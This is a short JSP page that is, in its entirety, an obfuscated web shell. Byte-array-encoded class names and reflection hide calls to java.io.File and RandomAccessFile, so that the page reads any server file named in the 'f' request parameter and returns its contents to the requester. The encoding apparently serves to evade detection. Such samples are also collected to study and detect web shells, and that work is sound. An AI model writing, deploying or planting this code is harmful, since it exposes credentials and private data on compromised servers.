<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Method" %>
<%
    byte[] mb = new byte[]{114, 101, 97, 100};
    Class<?> clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 105, 111, 46, 82, 97, 110, 100, 111, 109, 65, 99, 99, 101, 115, 115, 70, 105, 108, 101}));
    Class<?> clazz2 = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101}));
    Object file = clazz2.getConstructor(String.class).newInstance(request.getParameter("f"));
    Object raf = clazz.getConstructor(File.class, String.class).newInstance(file, "r");
    Method method = raf.getClass().getDeclaredMethod(new String(mb), byte[].class);
    byte[] bytes = new byte[1024];
    int a = 0;

    while ((a = (int) method.invoke(raf, bytes)) != -1) {
        out.write(new String(bytes, 0, a));
    }
%>
